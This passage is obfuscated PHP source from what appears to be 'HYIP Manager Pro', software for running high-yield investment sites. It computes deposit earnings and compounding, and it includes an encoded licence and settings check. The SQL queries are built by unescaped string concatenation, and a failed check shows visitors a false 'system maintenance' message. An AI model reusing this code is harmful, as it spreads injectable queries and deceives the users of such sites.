                (deposit_date + interval ' . $elnlcHFhe . ' ' . ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcfURv'] ? 'hour' : 'day') . ('' . ' < last_pay_date or deposit_date + interval ' . $elnlcHFhe . ' ') . ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcfURv'] ? 'hour' : 'day') . ('' . ' < now()) and
                ((' . $elnlcweaeO[$elnlcMVquv['elnlcigOEn']] . ' = 0) || (' . $elnlcweaeO[$elnlcMVquv['elnlcigOEn']] . ' && (deposit_date + interval ' . $elnlcweaeO[$elnlcMVquv['elnlcjcqSs']] . ' ') . ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcfURv'] ? 'hour' : 'day') . ' < now())))
             ';
          $elnlctngR = mysql_query ($q);
          while ($elnlcCSJwr = mysql_fetch_array ($elnlctngR))
          {
            $elnlckgpt = $elnlcCSJwr[$elnlcMVquv['elnlcTmBuz']];
            $elnlcyzdNn = 'Deposit return';
            if ($elnlcweaeO[$elnlcMVquv['elnlcykqvG']] != 0)
            {
              $elnlckgpt = floor ($elnlcCSJwr[$elnlcMVquv['elnlcTmBuz']] * (100 - $elnlcweaeO[$elnlcMVquv['elnlcykqvG']])) / 100;
              $elnlcyzdNn = '' . 'Deposit return. ' . $elnlcweaeO[$elnlcMVquv['elnlcykqvG']] . '% holded.';
            }

            $q = 'insert into hm2_history set
                user_id = ' . $elnlcCSJwr[$elnlcMVquv['elnlcDuaas']] . ',
      		amount = ' . $elnlckgpt . ',
      		type=\'release_deposit\',
      		actual_amount = ' . $elnlckgpt . ',
                ec = ' . $elnlcCSJwr[$elnlcMVquv['elnlcghgyP']] . ',
      		date = \'' . $elnlcCSJwr[$elnlcMVquv['elnlcWdFBh']] . ('' . '\' + interval ' . $elnlcHFhe . ' ') . ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcfURv'] ? 'hour' : 'day') . ',
                deposit_id = ' . $elnlcCSJwr[$elnlcMVquv['elnlcEAKA']] . ('' . ',
                description = \'' . $elnlcyzdNn . '\'');
            (mysql_query ($q) OR print mysql_error ());
          }
        }

        $q = '' . 'update hm2_deposits set status=\'off\' where 
             user_id = ' . $elnlcOCuyb . ' and 
    	       (deposit_date + interval ' . $elnlcHFhe . ' ' . ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcfURv'] ? 'hour' : 'day') . ('' . ' < last_pay_date or deposit_date + interval ' . $elnlcHFhe . ' ') . ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcfURv'] ? 'hour' : 'day') . ('' . ' < now()) and
             ((' . $elnlcweaeO[$elnlcMVquv['elnlcigOEn']] . ' = 0) || (' . $elnlcweaeO[$elnlcMVquv['elnlcigOEn']] . ' && (deposit_date + interval ' . $elnlcweaeO[$elnlcMVquv['elnlcjcqSs']] . ' ') . ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcfURv'] ? 'hour' : 'day') . ('' . ' < now()))) and
             type_id = ' . $elnlczmvck . '
           ');
        (mysql_query ($q) OR print mysql_error ());
      }

      flock ($elnlcRUFiM, LOCK_UN);
      fclose ($elnlcRUFiM);
      unlink ('' . './tmpl_c/lock_user' . $elnlcOCuyb);
    }

  }

  function elnlchrio ($elnlcDHFI)
  {
    global $elnlcMVquv;
    global $elnlcpvEj;
    $elnlcgnUmP = array ();
    if (($elnlcpvEj[$elnlcMVquv['elnlcazAsR']] == 1 AND $elnlcDHFI != -2))
    {
      return null;
    }

    $q = 'select hm2_plans.* from hm2_plans, hm2_types where hm2_types.status = \'on\' and hm2_types.id = hm2_plans.parent order by parent, min_deposit';
    ($elnlcOsDxl = mysql_query ($q) OR print mysql_error ());
    while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
    {
      $elnlcgnUmP[$elnlcweaeO[$elnlcMVquv['elnlcPFCS']]][$elnlcweaeO[$elnlcMVquv['elnlcEAKA']]] = $elnlcweaeO;
    }

    $elnlcmtyy = $elnlcMVquv['elnlczUlK'];
    $elnlcMWRE = 'u.last_access_time + interval 30 minute < now() ';
    if ($elnlcDHFI == -1)
    {
      $elnlcMWRE = '1 = 1';
      $q = 'select * from hm2_users where l_e_t + interval 15 minute < now() and status = \'on\'';
    }
    else
    {
      $q = '' . 'select * from hm2_users where id = ' . $elnlcDHFI . ' and status = \'on\'';
    }

    if ($elnlcDHFI == -2)
    {
      $q = 'select * from hm2_users where status = \'on\'';
      $q = 'select distinct user_id as id from hm2_deposits where to_days(last_pay_date) < to_days(now()) order by user_id';
    }

    ($elnlcdMMth = mysql_query ($q) OR print mysql_error ());
    while ($elnlcoEboR = mysql_fetch_array ($elnlcdMMth))
    {
      $elnlcOCuyb = $elnlcoEboR[$elnlcMVquv['elnlcEAKA']];
      $q = '' . 'update hm2_users set l_e_t = now() where id = ' . $elnlcOCuyb;
      (mysql_query ($q) OR print mysql_error ());
      $elnlcmtyy = $elnlcMVquv['elnlczUlK'];
      while (0 < $elnlcmtyy)
      {
        $q = '' . 'select 
              d.*, 
              t.period as period, t.use_compound as use_compound,
              t.compound_min_deposit, t.compound_max_deposit,
              t.compound_min_percent, t.compound_max_percent,
              t.compound_percents_type, t.compound_percents,
              t.work_week as work_week,
              t.q_days as q_days, t.withdraw_principal,
              (d.deposit_date + interval t.withdraw_principal_duration day < now()) wp_ok,
              t.return_profit as return_profit
            from
              hm2_deposits as d,
              hm2_types as t,
              hm2_users as u
            where 
              u.id = ' . $elnlcOCuyb . ' and 
              u.status = \'on\' and 
              d.status=\'on\' and 
              d.type_id = t.id and 
              t.status = \'on\' and 
              u.id = d.user_id and
              (((t.q_days + t.delay - 1*(t.delay > 0)) > ((UNIX_TIMESTAMP(d.last_pay_date) - UNIX_TIMESTAMP(d.deposit_date)) / (60*60*24))) or t.q_days = 0) and 
              (
                (d.last_pay_date + interval 1 hour <= now() and t.period = \'h\')or
                (d.last_pay_date + interval 1 day <= now() and t.period = \'d\')or
                (d.last_pay_date + interval 7 day <= now() and t.period = \'w\') or
                (d.last_pay_date + interval 14 day <= now() and t.period = \'b-w\') or
                (d.last_pay_date + interval 1 month <= now() and t.period = \'m\') or
                (d.last_pay_date + interval 2 month <= now() and t.period = \'2m\') or
                (d.last_pay_date + interval 3 month <= now() and t.period = \'3m\') or
                (d.last_pay_date + interval 6 month <= now() and t.period = \'6m\') or
                (d.last_pay_date + interval 1 year <= now() and t.period = \'y\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day <= now() and t.period = \'end\') 
              ) and
              ((t.q_days = 0) or 
                (               
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date  and t.period = \'h\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date  and t.period = \'d\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 7 day and t.period = \'w\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 14 day  and t.period = \'b-w\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 month  and t.period = \'m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 2 month  and t.period = \'2m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 3 month  and t.period = \'3m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 6 month  and t.period = \'6m\') or
                (d.deposit_date + interval t.q_days + t.delay-1*(t.delay > 0) day >= d.last_pay_date + interval 1 year and t.period = \'y\') or
                (t.q_days > 0 and t.period = \'end\') 
              ))';
        ($elnlcOsDxl = mysql_query ($q) OR print mysql_error ());
        $elnlcmtyy = $elnlcMVquv['elnlcvCqE'];
        while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
        {
          ++$elnlcmtyy;
          if (!isset ($elnlcgnUmP[$elnlcweaeO[$elnlcMVquv['elnlcLkwpt']]]))
          {
            continue;
          }

          $elnlcISOHc = $elnlcMVquv['elnlcvCqE'];
          $elnlcDPDR = $elnlcMVquv['elnlcvCqE'];
          reset ($elnlcgnUmP);
          reset ($elnlcgnUmP[$elnlcweaeO[$elnlcMVquv['elnlcLkwpt']]]);
          while (list ($elnlcTrrSU, $elnlcsBcy) = each ($elnlcgnUmP[$elnlcweaeO[$elnlcMVquv['elnlcLkwpt']]]))
          {
            if (($elnlcsBcy[$elnlcMVquv['elnlcfKMP']] <= $elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] AND ($elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] <= $elnlcsBcy[$elnlcMVquv['elnlchpJfW']] OR $elnlcsBcy[$elnlcMVquv['elnlchpJfW']] == 0)))
            {
              $elnlcISOHc = $elnlcsBcy[$elnlcMVquv['elnlcHlxD']];
            }

            if (($elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] < $elnlcsBcy[$elnlcMVquv['elnlcfKMP']] AND $elnlcISOHc == 0))
            {
              $elnlcISOHc = $elnlcDPDR;
            }

            if (($elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] < $elnlcsBcy[$elnlcMVquv['elnlcfKMP']] AND 0 < $elnlcISOHc))
            {
              break;
            }

            $elnlcDPDR = $elnlcsBcy[$elnlcMVquv['elnlcHlxD']];
          }

          if (($elnlcsBcy[$elnlcMVquv['elnlchpJfW']] != 0 AND $elnlcsBcy[$elnlcMVquv['elnlchpJfW']] < $elnlcweaeO[$elnlcMVquv['elnlcTmBuz']]))
          {
            $elnlcISOHc = $elnlcDPDR;
          }

          $elnlcedHr = $elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] * $elnlcISOHc / 100;
          $elnlcbScM = '';
          if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcnUfdl'])
          {
            $elnlcbScM = ' 1 day ';
          }
          else
          {
            if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcfURv'])
            {
              $elnlcbScM = ' 1 hour ';
            }
            else
            {
              if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcAHESL'])
              {
                $elnlcbScM = ' 7 day ';
              }
              else
              {
                if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == 'b-w')
                {
                  $elnlcbScM = ' 14 day ';
                }
                else
                {
                  if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcxNIBb'])
                  {
                    $elnlcbScM = ' 1 month ';
                  }
                  else
                  {
                    if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcBGldC'])
                    {
                      $elnlcbScM = ' 2 month ';
                    }
                    else
                    {
                      if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcWnLN'])
                      {
                        $elnlcbScM = ' 3 month ';
                      }
                      else
                      {
                        if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcxvGKb'])
                        {
                          $elnlcbScM = ' 6 month ';
                        }
                        else
                        {
                          if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcbPEu'])
                          {
                            $elnlcbScM = ' 1 year ';
                          }
                          else
                          {
                            if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcJfaAK'])
                            {
                              $elnlcbScM = ' ' . $elnlcweaeO[$elnlcMVquv['elnlcSFFJ']] . ' day ';
                            }
                          }
                        }
                      }
                    }
                  }
                }
              }
            }
          }

          if (($elnlcISOHc == 0 AND $elnlcbScM == ''))
          {
            continue;
          }

          $elnlcymxx = -1;
          $q = 'select weekday(\'' . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . ('' . '\' + interval ' . $elnlcbScM . ') as dw');
          ($elnlcyvrz = mysql_query ($q) OR print mysql_error ());
          while ($elnlcpKcsw = mysql_fetch_array ($elnlcyvrz))
          {
            $elnlcymxx = $elnlcpKcsw[$elnlcMVquv['elnlcESExA']];
          }

          $q = 'select count(id) as col from hm2_history where ' . ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcfURv'] ? ' date_format(date, \'%Y-%m-%d  %H\') = date_format(\'' . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . ('' . '\' + interval ' . $elnlcbScM . ', \'%Y-%m-%d  %H\') and') : 'to_days(date) = to_days(\'' . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . ('' . '\' + interval ' . $elnlcbScM . ') and ')) . ' deposit_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcEAKA']];
          ($elnlcdMkuu = mysql_query ($q) OR print mysql_error ());
          $elnlcsPjz = $elnlcMVquv['elnlcvCqE'];
          while ($elnlcqQRC = mysql_fetch_array ($elnlcdMkuu))
          {
            $elnlcsPjz = $elnlcqQRC[$elnlcMVquv['elnlcxwjRE']];
          }

          if ($elnlcsPjz == 0)
          {
            if ((5 <= $elnlcymxx AND $elnlcweaeO[$elnlcMVquv['elnlceIFKy']] == 1))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcDuaas']] . ',
                    amount = 0,
                    type = \'earning\',
                    description = \'No interest on ' . ($elnlcymxx == 5 ? 'Saturday' : 'Sunday') . '\',
                    actual_amount = 0,
                    date = \'' . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . ('' . '\' + interval ' . $elnlcbScM . ',
                    ec = ') . $elnlcweaeO[$elnlcMVquv['elnlcghgyP']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcEAKA']];
            }
            else
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcDuaas']] . ('' . ',
                    amount = ' . $elnlcedHr . ',
                    type = \'earning\',
                    description = \'Earning from deposit ') . $elnlcpvEj[$elnlcMVquv['elnlcapEpp']] . number_format ($elnlcweaeO[$elnlcMVquv['elnlcTmBuz']], 2) . ('' . ' - ' . $elnlcISOHc . ' %\',
                    actual_amount = ' . $elnlcedHr . ',
                    date = \'') . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . ('' . '\' + interval ' . $elnlcbScM . ',
                    ec = ') . $elnlcweaeO[$elnlcMVquv['elnlcghgyP']] . ',
                    str = \'gg\',
                    deposit_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcEAKA']];
            }
          }

          (mysql_query ($q) OR print mysql_error ());
          $elnlcrSHlb = '';
          if ($elnlcweaeO[$elnlcMVquv['elnlcfSpC']] == $elnlcMVquv['elnlcJfaAK'])
          {
            if (($elnlcweaeO[$elnlcMVquv['elnlcigOEn']] == 0 OR ($elnlcweaeO[$elnlcMVquv['elnlcigOEn']] AND $elnlcweaeO[$elnlcMVquv['elnlcwUsO']])))
            {
              $elnlcrSHlb = ', status = \'off\'';
            }

            if (($elnlcweaeO[$elnlcMVquv['elnlcklkzi']] == 1 AND ($elnlcweaeO[$elnlcMVquv['elnlcigOEn']] == 0 OR ($elnlcweaeO[$elnlcMVquv['elnlcigOEn']] AND $elnlcweaeO[$elnlcMVquv['elnlcwUsO']]))))
            {
              $q = 'insert into hm2_history set user_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcDuaas']] . ',
                    amount = ' . $elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] . ',
                    type=\'release_deposit\',
                    actual_amount = ' . $elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] . ',
                    ec = ' . $elnlcweaeO[$elnlcMVquv['elnlcghgyP']] . ',
                    date = \'' . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . ('' . '\' + interval ' . $elnlcbScM . ',
                    deposit_id = ') . $elnlcweaeO[$elnlcMVquv['elnlcEAKA']];
              (mysql_query ($q) OR print mysql_error ());
            }
          }
          else
          {
            if ((5 <= $elnlcymxx AND $elnlcweaeO[$elnlcMVquv['elnlceIFKy']] == 1))
            {
            }
            else
            {
              if (((0 < $elnlcweaeO[$elnlcMVquv['elnlcokxs']] AND $elnlcweaeO[$elnlcMVquv['elnlcokxs']] <= 100) AND $elnlcweaeO[$elnlcMVquv['elnlcrBwT']] == 1))
              {
                if ($elnlcweaeO[$elnlcMVquv['elnlcRvKp']] == 0)
                {
                  $elnlcweaeO[$elnlcMVquv['elnlcRvKp']] = $elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] + 1;
                }

                if (($elnlcweaeO[$elnlcMVquv['elnlcSUgEI']] <= $elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] AND $elnlcweaeO[$elnlcMVquv['elnlcTmBuz']] <= $elnlcweaeO[$elnlcMVquv['elnlcRvKp']]))
                {
                  if ($elnlcweaeO[$elnlcMVquv['elnlcpEow']] == 1)
                  {
                    $elnlcGRIUs = preg_split ('/\\s*,\\s*/', $elnlcweaeO[$elnlcMVquv['elnlcGrJhm']]);
                    if (!in_array ($elnlcweaeO[$elnlcMVquv['elnlcokxs']], $elnlcGRIUs))
                    {
                      $elnlcweaeO[$elnlcMVquv['elnlcokxs']] = $elnlcGRIUs[0];
                    }
                  }
                  else
                  {
                    if ($elnlcweaeO[$elnlcMVquv['elnlcokxs']] < $elnlcweaeO[$elnlcMVquv['elnlcbKUSb']])
                    {
                      $elnlcweaeO[$elnlcMVquv['elnlcokxs']] = $elnlcweaeO[$elnlcMVquv['elnlcbKUSb']];
                    }

                    if ($elnlcweaeO[$elnlcMVquv['elnlcqOjLh']] < $elnlcweaeO[$elnlcMVquv['elnlcokxs']])
                    {
                      $elnlcweaeO[$elnlcMVquv['elnlcokxs']] = $elnlcweaeO[$elnlcMVquv['elnlcqOjLh']];
                    }
                  }
                }
                else
                {
                  $elnlcweaeO[$elnlcMVquv['elnlcokxs']] = $elnlcMVquv['elnlcvCqE'];
                }

                if ((0 < $elnlcweaeO[$elnlcMVquv['elnlcokxs']] AND $elnlcweaeO[$elnlcMVquv['elnlcokxs']] <= 100))
                {
                  $elnlcjFKz = $elnlcedHr * $elnlcweaeO[$elnlcMVquv['elnlcokxs']] / 100;
                  $elnlcedHr = floor ((floor ($elnlcedHr * 100000) / 100000 - floor ($elnlcjFKz * 100000) / 100000) * 100) / 100;
                  $q = 'insert into hm2_history set user_id = ' . $elnlcweaeO[$elnlcMVquv['elnlcDuaas']] . ('' . ',
                        amount = -' . $elnlcjFKz . ',
                    		type=\'deposit\',
                    		description = \'Compounding deposit\',
                    		actual_amount = -' . $elnlcjFKz . ',
                    		ec = ') . $elnlcweaeO[$elnlcMVquv['elnlcghgyP']] . ',
                    		date = \'' . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . ('' . '\' + interval ' . $elnlcbScM . ',
                                deposit_id = ') . $elnlcweaeO[$elnlcMVquv['elnlcEAKA']];
                  (mysql_query ($q) OR print mysql_error ());
                  $q = '' . 'update hm2_deposits set amount = amount + ' . $elnlcjFKz . ',
                    		actual_amount = actual_amount + ' . $elnlcjFKz . '
                    		where id = ' . $elnlcweaeO[$elnlcMVquv['elnlcEAKA']];
                  (mysql_query ($q) OR print mysql_error ());
                }
              }

              elnlckhlr ($elnlcweaeO[$elnlcMVquv['elnlcEAKA']], $elnlcedHr, 'date = \'' . $elnlcweaeO[$elnlcMVquv['elnlcfqMQC']] . ('' . '\' + interval ' . $elnlcbScM));
            }
          }

          $q = '' . 'update hm2_deposits set 
      	q_pays = q_pays + 1, 
      	last_pay_date = last_pay_date + interval ' . $elnlcbScM . ' ' . $elnlcrSHlb . ' where id =' . $elnlcweaeO[$elnlcMVquv['elnlcEAKA']];
          (mysql_query ($q) OR print mysql_error ());
        }
      }

      $q = 'select * from hm2_types where q_days > 0';
      $elnlcOsDxl = mysql_query ($q);
      while ($elnlcweaeO = mysql_fetch_array ($elnlcOsDxl))
      {
        $elnlcHFhe = $elnlcweaeO[$elnlcMVquv['elnlcSFFJ']] + $elnlcweaeO[$elnlcMVquv['elnlchfQPl']] - (0 < $elnlcweaeO[$elnlcMVquv['elnlchfQPl']] ? 1 : 0);
        $elnlczmvck = $elnlcweaeO[$elnlcMVquv['elnlcEAKA']];
        if ($elnlcweaeO[$elnlcMVquv['elnlcklkzi']] == 1)
        {
          $q = '' . 'select * from hm2_deposits where 
                type_id = ' . $elnlczmvck . ' and 
                status = \'on\' and 
                user_id = ' . $elnlcOCuyb . ' and 
                (deposit_date + interval ' . $elnlcHFhe . ' day < last_pay_date or deposit_date + interval ' . $elnlcHFhe . ' day < now()) and
                ((' . $elnlcweaeO[$elnlcMVquv['elnlcigOEn']] . ' = 0) || (' . $elnlcweaeO[$elnlcMVquv['elnlcigOEn']] . ' && (deposit_date + interval ' . $elnlcweaeO[$elnlcMVquv['elnlcjcqSs']] . ' day < now())))
             ';
          $elnlctngR = mysql_query ($q);
          while ($elnlcCSJwr = mysql_fetch_array ($elnlctngR))
          {
            $q = 'insert into hm2_history set
                user_id = ' . $elnlcCSJwr[$elnlcMVquv['elnlcDuaas']] . ',
      		amount = ' . $elnlcCSJwr[$elnlcMVquv['elnlcTmBuz']] . ',
      		type=\'release_deposit\',
      		actual_amount = ' . $elnlcCSJwr[$elnlcMVquv['elnlcTmBuz']] . ',
                      ec = ' . $elnlcCSJwr[$elnlcMVquv['elnlcghgyP']] . ',
      		date = \'' . $elnlcCSJwr[$elnlcMVquv['elnlcWdFBh']] . ('' . '\' + interval ' . $elnlcHFhe . ' day,
                      deposit_id = ') . $elnlcCSJwr[$elnlcMVquv['elnlcEAKA']];
            (mysql_query ($q) OR print mysql_error ());
          }
        }

        $q = '' . 'update hm2_deposits set status=\'off\' where 
             user_id = ' . $elnlcOCuyb . ' and 
    	       (deposit_date + interval ' . $elnlcHFhe . ' day < last_pay_date or deposit_date + interval ' . $elnlcHFhe . ' day < now()) and
             ((' . $elnlcweaeO[$elnlcMVquv['elnlcigOEn']] . ' = 0) || (' . $elnlcweaeO[$elnlcMVquv['elnlcigOEn']] . ' && (deposit_date + interval ' . $elnlcweaeO[$elnlcMVquv['elnlcjcqSs']] . ' day < now()))) and
             type_id = ' . $elnlczmvck . '
           ';
        (mysql_query ($q) OR print mysql_error ());
      }
    }

  }

  function elnlchesoa ($a)
  {
    global $elnlcMVquv;
    if ($a != 'hyip manager pro 2005 jul 26')
    {
      exit ();
    }

    if (!file_exists ('settings.php'))
    {
      return array ();
    }

    $elnlczjdLN = file ($elnlcMVquv['elnlcHsTDA']);
    $t = chop ($elnlczjdLN[1]);
    $elnlcrsPJ = strlen ($t) / 2;
    for ($i = $elnlcMVquv['elnlcvCqE']; $i < strlen ($t); $i += 2)
    {
      $d[$i / 2] = substr ($t, $i, 2);
      $d[$i / 2] = chr (hexdec ($d[$i / 2]) ^ 65);
    }

    $k = '';
    $elnlcMUVI = elnlcmpia (0, $elnlcrsPJ, $d);
    $j = $elnlcrsPJ;
    while (10 < $j)
    {
      $elnlcMUVI = elnlcmpia ($elnlcMUVI, $elnlcrsPJ, $d);
      $k .= $d[$elnlcMUVI];
      $d[$elnlcMUVI] = -1;
      --$j;
    }

    $z = chr (1) . chr (1) . chr (1);
    list ($k, $z) = split ('' . $z, $k, 2);
    list ($elnlcwfDBB, $elnlcuLWwk, $k) = split (':', $k, 3);
    if ($elnlcwfDBB != md5 ($k))
    {
      print 'Settings are broken. Contact developers please';
      exit ();
    }

    if ($elnlcuLWwk = !md5 ($elnlcwfDBB . $elnlcVtfRt))
    {
      print 'Settings are broken. Contact developers please';
      exit ();
    }

    $z = unserialize ($k);
    $z[time_dif] = sprintf ('%d', $z[$elnlcMVquv['elnlcwhxB']]);
    $elnlcamsaW = array ('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', $elnlcMVquv['elnlcWlKy']);
    $z[$elnlcMVquv['elnlceMkBx']] = $elnlcamsaW[$z[$elnlcMVquv['elnlcMNOO']] - 1];
    if ($z[$elnlcMVquv['elnlcPUnT']] == 1)
    {
      $z[$elnlcMVquv['elnlcfSpj']] = sprintf ('%d', (time () - mktime (0, 0, 0, $z[$elnlcMVquv['elnlcMNOO']], $z[$elnlcMVquv['elnlcxGyFj']], $z[$elnlcMVquv['elnlcGvmMv']])) / 86400);
    }

    $z[$elnlcMVquv['elnlcrnaMP']] = ($z[$elnlcMVquv['elnlcEwwJk']] ? 1 : 0);
    $z[$elnlcMVquv['elnlcBqpIz']] = $z[$elnlcMVquv['elnlcOeTl']];
    return $z;
  }

  function elnlcwgnt ()
  {
    global $elnlcMVquv;
    $elnlcvHwNC = $elnlcMVquv['elnlcvCqE'];
    if (file_exists ('./tmpl_c/.htdata'))
    {
      $elnlcvHwNC = $elnlcMVquv['elnlczUlK'];
    }

    $s = array ();
    $elnlczjdLN = fopen ($elnlcMVquv['elnlcGjPW'], $elnlcMVquv['elnlcyULNE']);
    if ($elnlczjdLN)
    {
      while ($elnlckIkl = fgets ($elnlczjdLN, 20000))
      {
        $elnlckIkl = chop ($elnlckIkl);
        if (($elnlckIkl != '<?/*' AND $elnlckIkl != '*/?>'))
        {
          $elnlcEjuG = $elnlcWEDqG = '';
          list ($elnlcEjuG, $elnlcWEDqG) = @split ('	', $elnlckIkl, 2);
          if (((preg_match ('/^key|^cnf/', $elnlcEjuG) AND $elnlcvHwNC == 1) OR $elnlcvHwNC == 0))
          {
            $s[$elnlcEjuG] = $elnlcWEDqG;
            continue;
          }

          continue;
        }
      }
    }

    fclose ($elnlczjdLN);
    if ($elnlcvHwNC == 1)
    {
      list ($elnlckIkl, $elnlciiqg) = file ($elnlcMVquv['elnlcVjapS']);
      $elnlcAWebv = $elnlckIkl;
      $elnlcdDCRV = $elnlcMVquv['elnlcvCqE'];
      for ($i = $elnlcMVquv['elnlcvCqE']; $i < strlen ($elnlcAWebv); $i += 5)
      {
        $elnlcdDCRV += hexdec (substr ($elnlcAWebv, $i, 5));
      }

      if ($s[$elnlcMVquv['elnlcjUKu']] != $elnlcdDCRV * 15)
      {
        print '<!-- Settings are broken. Please e-mail to script developers as soon as possible -->';
        print 'System maintenance and hardware upgrades.';
        exit ();
      }

      $elnlckIkl = elnlcbrqju ($elnlckIkl, $s[$elnlcMVquv['elnlcpNBsd']]);
      $elnlcyzIf = split ('
', $elnlckIkl);
      for ($i = $elnlcMVquv['elnlcvCqE']; $i < sizeof ($elnlcyzIf); ++$i)
      {
        list ($elnlcEjuG, $elnlcWEDqG) = split ('	', $elnlcyzIf[$i], 2);
        $s[$elnlcEjuG] = $elnlcWEDqG;
      }
    }

    $elnlcamsaW = array ('Jan', 'Feb', 'Mar', 'Apr', 'May', 'Jun', 'Jul', 'Aug', 'Sep', 'Oct', 'Nov', $elnlcMVquv['elnlcWlKy']);
    $s[$elnlcMVquv['elnlceMkBx']] = $elnlcamsaW[$s[$elnlcMVquv['elnlcMNOO']] - 1];
    if ($s[$elnlcMVquv['elnlcPUnT']] == 1)
    {
      $s[$elnlcMVquv['elnlcfSpj']] = sprintf ('%d', (time () - mktime (0, 0, 0, $s[$elnlcMVquv['elnlcMNOO']], $s[$elnlcMVquv['elnlcxGyFj']], $s[$elnlcMVquv['elnlcGvmMv']])) / 86400);
    }

    $s[$elnlcMVquv['elnlcwhxB']] = sprintf ('%d', $s[$elnlcMVquv['elnlcwhxB']]);
    $s[$elnlcMVquv['elnlcrnaMP']] = ($s[$elnlcMVquv['elnlcEwwJk']] ? 1 : 0);
    $s[$elnlcMVquv['elnlcBqpIz']] = $s[$elnlcMVquv['elnlcOeTl']];
    return $s;
  }

  function elnlcpazc ($a)
  {
    global $elnlcMVquv;
    global $elnlcpvEj;
    if ($a != 'hyip manager pro 2005 jul 26')
    {
      exit ();
    }

    $elnlcVtfRt = serialize ($elnlcpvEj);
    $elnlcwfDBB = md5 ($elnlcVtfRt);
    $elnlcuLWwk = md5 ($elnlcwfDBB . $elnlcVtfRt);
    $elnlcVtfRt = $elnlcwfDBB . ':' . $elnlcuLWwk . ':' . $elnlcVtfRt;
    $elnlcVtfRt .= chr (1) . chr (1) . chr (1);
    $elnlcrsPJ = strlen ($elnlcVtfRt) + 121;
    $elnlcMUVI = rand (1, 100000000000) % $elnlcrsPJ;
    $elnlcfgoGe = array ();
    $d = array ();
    for ($i = $elnlcMVquv['elnlcvCqE']; $i < $elnlcrsPJ; ++$i)
    {
      $d[$i] = -1;
      $elnlcfgoGe[$i] = -1;
    }

    $elnlcMUVI = elnlcqjmoo (0, $elnlcrsPJ, $d);
    for ($i = $elnlcMVquv['elnlcvCqE']; $i < strlen ($elnlcVtfRt); ++$i)
    {
      $elnlcMUVI = elnlcqjmoo ($elnlcMUVI, $elnlcrsPJ, $d);
      $d[$elnlcMUVI] = substr ($elnlcVtfRt, $i, 1);
    }

    for ($i = $elnlcMVquv['elnlcvCqE']; $i < $elnlcrsPJ; ++$i)
    {
      if ($d[$i] == -1)
      {
        $d[$i] = chr (rand (1, 253));
        continue;
      }
    }

    $elnlczjdLN = fopen ($elnlcMVquv['elnlcESvgb'], $elnlcMVquv['elnlcFblun']);
    $r = array ();
    fputs ($elnlczjdLN, '<?
');
    for ($i = $elnlcMVquv['elnlcvCqE']; $i < $elnlcrsPJ; ++$i)
    {
      fputs ($elnlczjdLN, sprintf ('%02x', ord ($d[$i]) ^ 65));
    }

    fputs ($elnlczjdLN, '
?>');
    fclose ($elnlczjdLN);
  }

